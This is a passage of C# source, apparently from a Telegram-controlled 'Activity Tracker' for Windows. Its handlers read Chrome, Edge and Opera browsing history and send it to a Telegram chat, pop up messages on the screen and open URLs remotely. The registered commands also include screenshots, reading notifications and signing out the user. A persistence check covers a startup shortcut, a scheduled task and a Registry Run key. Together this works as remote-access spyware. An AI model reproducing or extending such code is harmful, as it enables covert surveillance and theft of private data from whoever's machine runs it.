        /// </summary>
        public async Task HandleHistoryCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                int limit = 10;
                var parts = commandText.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length >= 2 && int.TryParse(parts[1], out int customLimit))
                {
                    limit = Math.Clamp(customLimit, 1, 50);
                }

                await SendChatActionAsync(chatId, "typing", cancellationToken);

                var history = _worker.GetBrowserHistory(limit);
                if (history == null || history.Count == 0)
                {
                    await SendMessageAsync("📂 *No browser history found.* (Supported browsers: Chrome, Edge, Opera)", chatId, cancellationToken);
                    return;
                }

                var sb = new StringBuilder();
                sb.AppendLine($"📅 <b>Recent Browser History (Top {history.Count}):</b>");
                sb.AppendLine();

                foreach (var entry in history)
                {
                    string title = System.Net.WebUtility.HtmlEncode(entry.Title).Trim();
                    string url = System.Net.WebUtility.HtmlEncode(entry.Url);
                    string browser = System.Net.WebUtility.HtmlEncode(entry.Browser);
                    
                    if (title.Length > 60) 
                        title = title.Substring(0, 57) + "...";
                    
                    sb.AppendLine($"• <b>[{browser}]</b> <a href=\"{url}\">{title}</a>");
                    sb.AppendLine($"  <i>Visited:</i> <code>{entry.VisitTime:yyyy-MM-dd HH:mm:ss}</code> (Count: {entry.VisitCount})");
                    sb.AppendLine();
                }

                await SendHtmlMessageAsync(sb.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /history command");
                await SendMessageAsync("❌ Failed to retrieve browser history.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /msg <Text> command
        /// </summary>
        public async Task HandleMsgCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                var parts = commandText.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length < 2)
                {
                    await SendMessageAsync("⚠️ *Usage:* `/msg <Text>`\n\nExample: `/msg Hello, this is a test alert!`", chatId, cancellationToken);
                    return;
                }

                string messageText = parts[1].Trim();
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                _worker.ShowRemoteMessage(messageText);

                await SendMessageAsync($"💬 *Remote alert sent to screen:* \n\n`{messageText}`", chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /msg command");
                await SendMessageAsync("❌ Failed to send remote screen alert.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /open <URL> command - opens a URL in the default browser
        /// </summary>
        public async Task HandleOpenCommandAsync(string chatId, string commandText, CancellationToken cancellationToken)
        {
            try
            {
                var parts = commandText.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
                if (parts.Length < 2)
                {
                    await SendMessageAsync("⚠️ *Usage:* `/open <URL>`\n\nExample: `/open https://www.google.com`", chatId, cancellationToken);
                    return;
                }

                string url = parts[1].Trim();
                
                // Validate URL format
                if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && 
                    !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    url = "https://" + url;
                }

                await SendChatActionAsync(chatId, "typing", cancellationToken);

                // Open URL in default browser
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };
                System.Diagnostics.Process.Start(psi);

                await SendMessageAsync($"🌐 *Opening URL in browser:* \n\n`{url}`", chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /open command");
                await SendMessageAsync("❌ Failed to open URL in browser.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /shutdown, /exit, /quit commands - stops the application
        /// </summary>
        public async Task HandleShutdownCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendMessageAsync("🛑 *Shutting down Activity Tracker...*\n\nThe application will stop running.", chatId, cancellationToken);
                
                // Give the message time to send
                await Task.Delay(1000, cancellationToken);
                
                // Stop the application gracefully
                _hostApplicationLifetime.StopApplication();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling shutdown command");
                await SendMessageAsync("❌ Error shutting down application.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles /persistence command
        /// </summary>
        public async Task HandlePersistenceCommandAsync(string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await SendChatActionAsync(chatId, "typing", cancellationToken);

                bool markerExists = StartupPersistence.IsInstalled;
                bool shortcutExists = System.IO.File.Exists(
                    System.IO.Path.Combine(StartupPersistence.StartupFolderPath, StartupPersistence.ShortcutFileName));

                bool taskExists = false;
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = $"/Query /TN \"{StartupPersistence.TaskName}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    using var proc = System.Diagnostics.Process.Start(psi);
                    proc?.WaitForExit(3000);
                    taskExists = proc?.ExitCode == 0;
                }
                catch { }

                bool registryExists = false;
                try
                {
                    using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run");
                    registryExists = key?.GetValue(StartupPersistence.RegistryValueName) != null;
                }
                catch { }

                var sb = new StringBuilder();
                sb.AppendLine("🛡️ *Auto-start Status:*");
                sb.AppendLine();
                sb.AppendLine($"• *Setup marker:* {(markerExists ? "✅" : "❌")}");
                sb.AppendLine($"• *Startup folder:* {(shortcutExists ? "✅" : "❌")}");
                sb.AppendLine($"• *Task Scheduler:* {(taskExists ? "✅" : "❌")}");
                sb.AppendLine($"• *Registry Run key:* {(registryExists ? "✅" : "❌")}");
                sb.AppendLine();

                if (!markerExists)
                {
                    sb.AppendLine("💡 Run the app once and accept the administrator \\(UAC\\) prompt to enable auto-start.");
                }

                await SendMessageAsync(sb.ToString(), chatId, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error handling /persistence command");
                await SendMessageAsync("❌ Failed to verify persistence status.", chatId, cancellationToken);
            }
        }

        /// <summary>
        /// Handles unknown commands
        /// </summary>
        public async Task HandleUnknownCommandAsync(string chatId, string command, CancellationToken cancellationToken)
        {
            var message = $"""
            ❓ *Unknown Command*
            
            I don't understand: `{command}`
            
            Type /help to see all available commands.
            """;

            await SendMessageAsync(message, chatId, cancellationToken);
        }

        #endregion

        #region Telegram API Methods

        public async Task RegisterBotCommandsAsync(CancellationToken cancellationToken)
        {
            try
            {
                var commands = new[]
                {
                    new BotCommand { Command = "menu", Description = "Open control panel" },
                    new BotCommand { Command = "track", Description = "Start monitoring" },
                    new BotCommand { Command = "stop", Description = "Stop monitoring" },
                    new BotCommand { Command = "status", Description = "Tracking status" },
                    new BotCommand { Command = "screenshot", Description = "Capture desktop" },
                    new BotCommand { Command = "notifications", Description = "Recent notifications" },
                    new BotCommand { Command = "signout", Description = "Sign out active user session" },
                    new BotCommand { Command = "stats", Description = "Activity statistics" },
                    new BotCommand { Command = "help", Description = "Command reference" },
                };
                await _botClient.SetMyCommands(commands, cancellationToken: cancellationToken);
                _logger.LogInformation("✅ Telegram bot command menu registered");
            }
            catch (Exception ex) when (ex.Message.Contains("401", StringComparison.Ordinal))
            {
                _logger.LogWarning(
                    "⚠️ Telegram bot token rejected (401 Unauthorized). " +
                    "Regenerate the token in @BotFather and update telegram_config.json, or run: dotnet run -- --setup");
            }
            catch (Exception ex)
            {
                _logger.LogWarning(ex, "⚠️ Failed to register bot commands");
            }
        }

        public async Task SendMainMenuAsync(string chatId, string? userName, CancellationToken cancellationToken)
        {
            await SendUiMessageAsync(
                TelegramUiMenus.MainMenuText(userName),
                chatId,
                TelegramUiMenus.MainMenu,
                cancellationToken);
        }

        public async Task EditMenuAsync(
            string chatId,
            int messageId,
            string htmlText,
            InlineKeyboardMarkup keyboard,
            CancellationToken cancellationToken)
        {
            try
            {
                await _botClient.EditMessageText(
                    chatId: chatId,
                    messageId: messageId,
                    text: htmlText,
                    parseMode: ParseMode.Html,
                    replyMarkup: keyboard,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogDebug(ex, "EditMessageText failed, sending new menu message");
                await SendUiMessageAsync(htmlText, chatId, keyboard, cancellationToken);
            }
        }

        public async Task SendPlainMessageAsync(string text, string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await _botClient.SendMessage(
                    chatId: chatId,
                    text: text,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending plain Telegram message");
            }
        }

        private async Task SendUiMessageAsync(
            string htmlText,
            string chatId,
            InlineKeyboardMarkup? keyboard,
            CancellationToken cancellationToken)
        {
            try
            {
                await _botClient.SendMessage(
                    chatId: chatId,
                    text: htmlText,
                    parseMode: ParseMode.Html,
                    replyMarkup: keyboard,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex) when (ex.Message.Contains("401", StringComparison.Ordinal))
            {
                _logger.LogError(
                    "❌ Telegram bot token rejected (401). Check telegram_config.json in the app folder or run --setup");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending UI Telegram message");
            }
        }

        /// <summary>
        /// Sends a MarkdownV2 formatted message (legacy handlers).
        /// </summary>
        private async Task SendMessageAsync(string text, string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await _botClient.SendMessage(
                    chatId: chatId,
                    text: EscapeNonFormattingMarkdown(text),
                    parseMode: ParseMode.MarkdownV2,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending Telegram message");
            }
        }

        private async Task SendHtmlMessageAsync(string text, string chatId, CancellationToken cancellationToken)
        {
            try
            {
                await _botClient.SendMessage(
                    chatId: chatId,
                    text: text,
                    parseMode: ParseMode.Html,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending Telegram HTML message");
            }
        }

        private async Task SendPhotoAsync(byte[] photoBytes, string filename, string chatId, string? caption, CancellationToken cancellationToken)
        {
            try
            {
                using var stream = new MemoryStream(photoBytes);
                await _botClient.SendPhoto(
                    chatId: chatId,
                    photo: InputFile.FromStream(stream, filename),
                    caption: string.IsNullOrEmpty(caption) ? null : EscapeNonFormattingMarkdown(caption),
                    parseMode: ParseMode.MarkdownV2,
                    cancellationToken: cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending Telegram photo");
            }
        }

        private async Task SendChatActionAsync(string chatId, string action, CancellationToken cancellationToken)
        {
            try
            {
                var chatAction = action switch
                {
                    "upload_photo" => ChatAction.UploadPhoto,
                    "typing" => ChatAction.Typing,
                    _ => ChatAction.Typing
                };
                await _botClient.SendChatAction(chatId, chatAction, cancellationToken: cancellationToken);
            }
            catch
            {
                // Non-essential
            }
        }

        private async Task SendWelcomeMessageAsync(CancellationToken cancellationToken)
        {
            try
            {
                var tracking = _worker.IsTrackingEnabled ? "ACTIVE" : "PAUSED";
                var message = $"""
                    <b>🚀 Activity Tracker is online!</b>

                    Remote control is ready. Tracking: <b>{tracking}</b>

                    Use the panel below or <code>/menu</code> anytime.
                    """;

                await SendUiMessageAsync(message, _chatId, TelegramUiMenus.MainMenu, cancellationToken);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "❌ Error sending welcome message");
            }
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Checks internet connectivity
        /// </summary>
        private async Task<bool> CheckInternetConnectionAsync()
        {
            try
            {
                using var ping = new System.Net.NetworkInformation.Ping();
                var reply = await ping.SendPingAsync("8.8.8.8", 3000);
                return reply?.Status == System.Net.NetworkInformation.IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Escapes all MarkdownV2 special characters except bold and code tags
        /// </summary>
        private static string EscapeNonFormattingMarkdown(string text)
        {
            if (string.IsNullOrEmpty(text))
                return string.Empty;

            var result = new StringBuilder(text);
            
            // First, escape all existing backslashes
            result.Replace("\\", "\\\\");

            // Then, escape other MarkdownV2 special characters EXCEPT * and `
            var specialChars = new[] { '_', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!' };
            foreach (var c in specialChars)
            {
                result.Replace(c.ToString(), $"\\{c}");
            }

            return result.ToString();
        }

        #endregion

        #region Cleanup

        public override async Task StopAsync(CancellationToken cancellationToken)
        {
            _logger.LogInformation("⌨️ Telegram Command Service stopping gracefully...");

            _pollingCts?.Cancel();

            try
            {
                await SendPlainMessageAsync("👋 Activity Tracker is going offline...", _chatId, cancellationToken);
            }
            catch
            {
                // Ignore errors during shutdown
            }

            await base.StopAsync(cancellationToken);
        }

        #endregion
    }
}